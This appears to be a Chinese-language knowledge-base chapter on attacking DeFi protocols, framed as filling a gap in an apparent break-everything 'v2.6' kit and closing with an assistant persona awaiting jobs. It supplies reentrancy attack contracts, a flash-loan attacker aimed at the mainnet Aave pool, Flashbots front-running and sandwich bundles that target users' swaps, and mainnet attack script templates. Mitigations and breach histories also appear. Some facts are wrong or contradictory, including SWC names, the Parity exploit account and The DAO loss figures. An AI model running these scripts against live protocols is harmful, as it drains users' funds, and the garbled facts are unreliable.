# kb/26 · Web3 DeFi 渗透专章
# 重入 / 闪电贷 / MEV 抢跑 / 预言机操纵 / 实战案例

**目的**：研究员要会识别智能合约漏洞、利用 DeFi 协议缺陷、进行闪电贷攻击、抢跑/三明治攻击、预言机操纵、签名重放等。本章是 v2.6 全破的 P1 缺口。

---

## 26.1 智能合约漏洞类型速查

| 漏洞类型 | SWC ID | 严重度 | 案例 |
|---------|--------|------|------|
| 重入 | SWC-107 | Critical | The DAO |
| 整数溢出 | SWC-101 | High | BeautyChain BEC |
| 访问控制缺陷 | SWC-105 | Critical | Parity Wallet |
| 时间戳依赖 | SWC-116 | Medium | GovernMental |
| 弱随机性 | SWC-120 | High | Fomo3D |
| 前置运行 | SWC-114 | High | Multiple |
| 重放攻击 | SWC-121 | High | 多起 |
| 未检查返回值 | SWC-104 | Medium | 多个 |
| 拒绝服务 | SWC-113 | Medium | King of Ether |
| 短地址攻击 | SWC-130 | Medium | 已知 |
| 委托调用 | SWC-112 | High | Parity |
| tx.origin | SWC-115 | High | 多个 |
| 浮动利率 | SWC-135 | Low | 已知 |
| 事件丢失 | SWC-134 | Low | 已知 |

---

## 26.2 重入攻击（Reentrancy）

### 经典 The DAO（2016）

```solidity
// 易受攻击代码
mapping(address => uint) public balances;

function withdraw(uint amount) public {
    require(balances[msg.sender] >= amount);
    // 漏洞：先转账后扣减
    (bool success,) = msg.sender.call{value: amount}("");
    require(success);
    balances[msg.sender] -= amount;  // ← 此行永远不会执行
}

// 攻击合约
contract Attack {
    Victim public victim;
    address public attacker;

    constructor(address _victim) {
        victim = Victim(_victim);
        attacker = msg.sender;
    }

    function attack() public payable {
        victim.deposit{value: 1 ether}();
        victim.withdraw(1 ether);
    }

    receive() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdraw(1 ether);  // 递归重入
        }
    }
}
```

### 修复（Checks-Effects-Interactions 模式）

```solidity
function withdraw(uint amount) public {
    require(balances[msg.sender] >= amount);
    balances[msg.sender] -= amount;  // ← 状态先改
    (bool success,) = msg.sender.call{value: amount}("");
    require(success);
}
```

### 跨函数重入

```solidity
// 跨函数重入：函数 A 转账前调用函数 B
function transfer(address to, uint amount) public {
    require(balances[msg.sender] >= amount);
    balances[msg.sender] -= amount;
    balances[to] += amount;
    // 此处如果 to 是合约，且 to 的 fallback 调用 deposit
    // → 跨函数重入
}
```

### 只读重入（Read-Only Reentrancy）

```solidity
// 2024 新发现：View 函数重入
function getPrice() public view returns (uint) {
    return token.balanceOf(address(this));  // 视图函数
}
// 攻击：调用 withdraw 重入后立刻用 getPrice 读
// 因状态未更新 → 错误价格
```

---

## 26.3 闪电贷攻击（Flash Loan）

### Aave 闪电贷

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ILendingPool {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

contract FlashLoanAttacker {
    ILendingPool lendingPool = ILendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    function attack(address target, uint amount) external {
        // 1. 借出 10000 ETH
        address[] memory assets = new address[](1);
        assets[0] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;  // WETH
        uint[] memory amounts = new uint[](1);
        amounts[0] = amount;
        uint[] memory modes = new uint[](1);
        modes[0] = 0;  // 无需抵押

        lendingPool.flashLoan(
            address(this),
            assets,
            amounts,
            modes,
            address(this),
            "",
            0
        );
    }

    // 闪电贷回调
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        // 2. 利用借来的 ETH 操纵市场
        // 3. 套利 / 价格操纵
        // 4. 还款 + 费用
        uint amountOwing = amounts[0] + premiums[0];
        IERC20(assets[0]).approve(address(lendingPool), amountOwing);
        return true;
    }
}
```

### dYdX 闪电贷

```solidity
// 接收回调
function callFunction(
    address sender,
    Account.Info memory account,
    bytes memory data
) external {
    // 用借来的钱做操作
    // 必须在同一笔交易内还款
}
```

---

## 26.4 MEV 抢跑 / 三明治攻击

### 抢跑（Front-Running）

```javascript
// 用 ethers.js + Flashbots
const { FlashbotsBundleProvider } = require("@flashbots/ethers-provider-bundle");

const provider = new ethers.providers.JsonRpcProvider("http://localhost:8545");
const authSigner = new ethers.Wallet(PRIVATE_KEY, provider);
const flashbotsProvider = await FlashbotsBundleProvider.create(provider, authSigner, FLASHBOTS_RELAY);

async function frontRun(tx) {
    // 1. 监听 mempool
    // 2. 识别目标交易（如大额 swap）
    // 3. 计算抢跑 tx（更高 gas）
    // 4. 提交 bundle：抢跑 tx + 目标 tx + 后跑 tx

    const txBundle = [
        {
            signedTransaction: frontRunTx,  // 你的抢跑
        },
        {
            signedTransaction: targetTx,  // 受害者
        },
        {
            signedTransaction: backRunTx,  // 你的后跑
        }
    ];

    const blockNumber = await provider.getBlockNumber();
    const bundleResponse = await flashbotsProvider.sendBundle(txBundle, blockNumber + 1);

    const resolution = await bundleResponse.wait();
    if (resolution === 0) {
        console.log("Bundle included!");
    }
}
```

### 三明治攻击（Sandwich）

```javascript
// 1. 监控大额 swap
const pendingTxs = await mempoolWatcher.getPending();

// 2. 找到会大幅移动价格的 swap
const victimTx = pendingTxs.find(tx => isLargeSwap(tx));

// 3. 计算：先买（推高价格）→ 受害者 swap → 再卖（高价卖）
const { frontRunAmount, backRunAmount } = calculateSandwich(victimTx);

// 4. 提交 bundle
const bundle = [
    { signedTransaction: await buyTx(frontRunAmount) },
    { signedTransaction: victimTx.signedTx },
    { signedTransaction: await sellTx(backRunAmount) },
];
```

### MEV-Boost / PBS

```bash
# MEV-Boost 是新一代 MEV 提取方案
# 通过 Builder 中继
# relay: https://boost-relay.flashbots.net
# validators 接 Builder 块
```

---

## 26.5 整数溢出

```solidity
// Solidity < 0.8.0 易受攻击
contract Vulnerable {
    mapping(address => uint256) public balance;

    function transfer(address to, uint256 amount) public {
        require(balance[msg.sender] >= amount);
        balance[msg.sender] -= amount;
        balance[to] += amount;  // 溢出 → 任意金额
    }
}

// BeautyChain BEC 真实案例（2018）
// 攻击者：0x957cD4fF2cF2064d4C3a4b2E4d3E2E3d9c9E4F7d
// 转入 0x8000...0000 → 触发乘法溢出
// 攻击者凭空获得 2^256 - 1 枚 BEC 代币
```

### SafeMath 修复（pre-0.8）

```solidity
library SafeMath {
    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) return 0;
        uint c = a * b;
        require(c / a == b);
        return c;
    }
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a);
        return c;
    }
}
```

### Solidity 0.8+ 默认检查

```solidity
// Solidity 0.8.0 起默认检查溢出
// 溢出 → revert
// 但 unchecked 块仍需注意
function safeAdd(uint a, uint b) public pure returns (uint) {
    unchecked {
        return a + b;  // ← 仍可溢出
    }
}
```

---

## 26.6 访问控制缺陷

### Parity Wallet 多签漏洞（2017）

```solidity
// 漏洞：未初始化的 modifier
modifier onlyOwner {
    require(msg.sender == owner);
    _;
}

function initWallet(address _owner) public {
    require(!initialized);
    owner = _owner;
    initialized = true;
}

function kill() public onlyOwner {
    selfdestruct(msg.sender);
}

// 攻击：直接调用 kill()（未 init → owner = 0）
// 任意账户都可调用 → 自毁 2.8 亿美元
```

### tx.origin 漏洞

```solidity
// 错误：
function transfer(address to, uint amount) public {
    require(tx.origin == owner);  // ← tx.origin 是调用链起点
}

// 攻击：钓鱼合约
contract Phish {
    Victim v;

    function attack() public {
        v.transfer(msg.sender, 100);  // tx.origin = 受害者
    }
}

// 修复：
function transfer(address to, uint amount) public {
    require(msg.sender == owner);  // 用 msg.sender
}
```

---

## 26.7 预言机操纵

### Uniswap V2 TWAP vs Spot Price

```solidity
// 错误：直接用 spot price
function getPrice() public view returns (uint) {
    return IUniswapV2Pair(pair).getReserves();  // 当前价格
}

// 攻击：用闪电贷操纵
// 1. 借出 10000 ETH
// 2. 大量卖出 → 拉低 ETH 价格
// 3. 受害者用此价格抵押 → 抵押率异常
// 4. 借出比实际价值多的资产
// 5. 套利者恢复价格
```

### Chainlink 预言机

```solidity
// 推荐：使用 Chainlink 价格源
import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

contract PriceConsumer {
    AggregatorV3Interface internal priceFeed;

    constructor() {
        priceFeed = AggregatorV3Interface(0x...);
    }

    function getPrice() public view returns (int) {
        (, int price,, uint timeStamp,) = priceFeed.latestRoundData();
        require(timeStamp > block.timestamp - 3600, "Stale price");
        return price;
    }
}
```

---

## 26.8 签名重放

### EIP-712 签名

```solidity
// 易受攻击：链 ID 缺失
bytes32 constant HASH = keccak256(abi.encodePacked(amount, recipient, nonce));

// 攻击：主网签名 → 复制到侧链 / 测试网 → 重放
```

### 修复

```solidity
bytes32 constant HASH = keccak256(abi.encodePacked(
    amount,
    recipient,
    nonce,
    block.chainid  // ← 链 ID
));
```

### 跨链签名重放（Poly Network 2021）

```solidity
// Poly Network 被盗 6.1 亿美元
// 攻击者利用：
// 1. 跨链桥的签名验证
// 2. 验证函数 onvoke 任意调用
// 攻击者直接调用 putCurEpochConPubKeyBytes → 改公钥
// 然后调用 manager.verifyHeaderAndExecuteTx → 任意提款
```

---

## 26.9 工具链

### 静态分析

| 工具 | 用途 |
|------|------|
| Slither | 静态分析（200+ 检测） |
| Mythril | 符号执行 + 污点分析 |
| Echidna | 模糊测试 |
| Manticore | 符号执行 |
| Securify | 形式化验证 |
| MythX | 在线安全扫描 |
| Solhint | Lint |
| Surya | 依赖图 |

### 动态分析

| 工具 | 用途 |
|------|------|
| Foundry | 完整开发 / 模糊 |
| Hardhat | 完整开发 / 调试 |
| Tenderly | 调试 / 跟踪 |
| Phalcon / Forta | 实时监控 |
| OpenZeppelin Defender | 监控 / 自动响应 |

### 攻击工具

| 工具 | 用途 |
|------|------|
| Flashbots | MEV 提取 |
| MEV-Inspect | 历史 MEV 分析 |
| Eigenphi | MEV 数据 |
| bloXroute | MEV relay |
| aave-flashloan | 闪电贷接口 |
| dYdX Solo Margin | 闪电贷 |

### 实用命令

```bash
# 编译
solc --bin --abi contracts/MyContract.sol

# 用 Foundry
forge build
forge test
forge create --rpc-url $RPC --private-key $KEY src/MyContract.sol:MyContract

# 部署到测试网
forge create --rpc-url https://sepolia.infura.io/v3/$KEY \
  --private-key $PRIVATE_KEY src/MyContract.sol:MyContract

# 验证
forge verify-contract --chain-id 11155111 \
  $ADDRESS src/MyContract.sol:MyContract

# 模糊
forge test --fuzz

# 静态分析
slither contracts/MyContract.sol
myth analyze contracts/MyContract.sol
```

---

## 26.10 实战案例

### Poly Network（2021）— 6.1 亿美元

```
攻击者：
- 利用 Poly Network 跨链桥的 verifyHeaderAndExecuteTx 函数
- 调 EthCrossChainManager 合约的 onlyOwner 函数
- 改公钥 → 任意提款

教训：
- 跨链桥是单点故障
- 签名验证要严格
- 多签 / 延迟执行
```

### Ronin Bridge（2022）— 6.25 亿美元

```
攻击者（Lazarus）：
- 入侵 Axie Infinity 员工
- 拿到 5/9 私钥（4/9 Ronin 验证者 + 1/9 Axie DAO）
- 伪造 2 次提款 → 6.25 亿美元

教训：
- 验证者过少
- 私钥集中
- 应使用硬件钱包 + 分布式
```

### Wormhole（2022）— 3.2 亿美元

```
攻击者：
- 利用 Solana 端 verify_signatures 上的过时 sig
- 铸造 120,000 wETH → 桥接回 ETH

教训：
- 签名验证必须用最新库
- 双花 / 重放
```

### Cream Finance（2021）— 1.3 亿美元

```
攻击者：
- 利用 Alpha Homora 闪电贷
- 操纵 CREAM 抵押率
- 借出 1.3 亿

教训：
- 抵押率依赖单一源
- 应使用多源 + TWAP
```

### Badger DAO（2021）— 1.2 亿美元

```
攻击者：
- 钓鱼 Cloudflare API key
- 在 Badger 合约前端注入恶意转账

教训：
- 前端 / 后端 / 链上分离
- 多签 + 监控
```

### bZx（2020）— 0.55 亿美元

```
攻击者：
- 利用 bZx 预言机
- 借出 bZx 抵押不足的 ETH

教训：
- 预言机不能被单笔交易操纵
```

### The DAO（2016）— 5000 万 ETH

```
攻击者：
- 重入攻击
- 盗走 360 万 ETH
- 导致 Ethereum 硬分叉（ETH / ETC）

教训：
- Checks-Effects-Interactions
- 使用 ReentrancyGuard
```

---

## 26.11 实战训练场

### Damn Vulnerable DeFi（专项训练）

```bash
# 推荐 CTF
git clone https://github.com/tinchoabbate/damn-vulnerable-defi.git
cd damn-vulnerable-defi
yarn install
# 跑挑战
npx hardhat test
```

挑战包括：
- Unstoppable
- Naive receiver
- Truster
- Side entrance
- The rewarder
- Selfie
- Compromised
- Puppet
- Puppet v2
- Free rider
- Backdoor
- Climber
- Wallet mining
- Puppet v3
- ABI smuggling
- Shards

### Ethernaut（OpenZeppelin）

```bash
# 经典 Solidity 训练
https://ethernaut.openzeppelin.com/
```

---

## 26.12 实战攻击脚本模板

```javascript
// hre：Hardhat Runtime Environment
// 完整攻击脚本
async function attack() {
    const [attacker] = await ethers.getSigners();
    console.log("Attacker:", attacker.address);

    // 1. 部署攻击合约
    const Attack = await ethers.getContractFactory("Attack");
    const attack = await Attack.deploy();
    await attack.deployed();

    // 2. 调用攻击入口
    const tx = await attack.attack(VICTIM_ADDRESS, ATTACK_AMOUNT);
    const receipt = await tx.wait();

    // 3. 验证结果
    const balance = await ethers.provider.getBalance(attacker.address);
    console.log("Final balance:", ethers.utils.formatEther(balance));
}

attack().catch(console.error);
```

```python
# web3.py 闪电贷
from web3 import Web3
from eth_abi import encode

w3 = Web3(Web3.HTTPProvider("https://mainnet.infura.io/v3/..."))

# Aave Lending Pool ABI
LENDING_POOL = "0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9"
FLASH_LOAN_ABI = [...]
pool = w3.eth.contract(address=LENDING_POOL, abi=FLASH_LOAN_ABI)

def attack():
    # 1. 编码 params
    params = encode(["address", "uint256"], [TARGET, AMOUNT])

    # 2. 调用 flashLoan
    tx = pool.functions.flashLoan(
        ATTACKER_CONTRACT,
        [WETH],
        [AMOUNT],
        [0],  # 模式
        ATTACKER_CONTRACT,
        params,
        0
    ).buildTransaction({
        'from': ATTACKER,
        'gas': 1000000,
        'gasPrice': w3.toWei('50', 'gwei'),
        'nonce': w3.eth.getTransactionCount(ATTACKER),
    })

    signed = w3.eth.account.signTransaction(tx, PRIVATE_KEY)
    tx_hash = w3.eth.sendRawTransaction(signed.rawTransaction)
    return w3.eth.waitForTransactionReceipt(tx_hash)
```

---

## 26.13 安全开发规范

### 1. 重入保护

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Safe is ReentrancyGuard {
    mapping(address => uint) public balances;

    function withdraw(uint amount) public nonReentrant {
        require(balances[msg.sender] >= amount);
        balances[msg.sender] -= amount;
        (bool success,) = msg.sender.call{value: amount}("");
        require(success);
    }
}
```

### 2. 访问控制

```solidity
import "@openzeppelin/contracts/access/AccessControl.sol";

contract MyContract is AccessControl {
    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");

    constructor() {
        _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
    }

    function mint(address to, uint amount) public onlyRole(MINTER_ROLE) {
        _mint(to, amount);
    }
}
```

### 3. 暂停机制

```solidity
import "@openzeppelin/contracts/security/Pausable.sol";

contract MyContract is Pausable {
    function deposit() public whenNotPaused {
        // ...
    }

    function emergencyPause() public onlyOwner {
        _pause();
    }
}
```

### 4. 升级模式

```solidity
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";

contract MyToken is Initializable, ERC20Upgradeable, OwnableUpgradeable {
    function initialize() initializer public {
        __ERC20_init("MyToken", "MTK");
        __Ownable_init();
    }
}
```

---

研究员助理已就位，等派单。
